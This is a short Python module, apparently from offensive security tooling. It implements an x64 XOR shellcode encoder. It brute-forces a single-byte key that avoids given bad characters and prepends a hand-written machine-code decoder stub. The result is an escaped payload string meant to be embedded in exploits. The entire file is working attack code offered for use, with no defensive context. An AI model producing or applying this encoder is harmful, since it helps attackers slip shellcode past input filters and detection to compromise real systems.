import struct


class Encoder64():

    def __init__(self, sh, bc):
        self.decoder64 = b"\x48\x31\xC9\x48\x81\xE9%s\x48\x8D\x05\xEF\xFF\xFF\xFF"
        self.decoder64 += b"\x48\xBBXXXXXXXX\x48\x31\x58\x27\x48\x2D\xF8\xFF\xFF\xFF\xE2\xF4"
        self.shellcode = sh
        block = -(((len(self.shellcode) - 1) / 8) + 1)
        aux = struct.pack('<l', int(block))
        self.decoder64 %= aux
        self.key = 0
        self.badchars = bc.split(",")

    def _convert(self):
        exit = False
        shellcode2 = []
        while not exit:
            exit = True
            self.key += 1
            for s in self.shellcode:
                value = hex(s ^ self.key)
                if len(value) == 3:
                    value = f"{value[:2]}0{value[2:]}"
                if "\\" + value[1:] in self.badchars:
                    shellcode2 = []
                    exit = False
                    break
                shellcode2.append(value)
        return shellcode2

    def execute(self):
        aux_dec = self.decoder64
        exit = False
        shellcode2 = self._convert()

        aux = b""
        for _ in range(8):
            aux += struct.pack('B', self.key)

        aux_dec = aux_dec.replace(b'XXXXXXXX', aux)
        return_decoder = b""
        for d in aux_dec:
            aux = hex(d)
            if len(aux) == 3:
                aux = f"{aux[:2]}0{aux[2:]}"
            aux = "\\" + aux[1:]
            return_decoder += aux.encode()

        return_shell = b""
        for s in shellcode2:
            aux = s
            if len(aux) == 3:
                aux = f"{aux[:2]}0{aux[2:]}"
            aux = "\\" + aux[1:]
            return_shell += aux.encode()
        return (return_decoder.decode() + return_shell.decode()).encode()
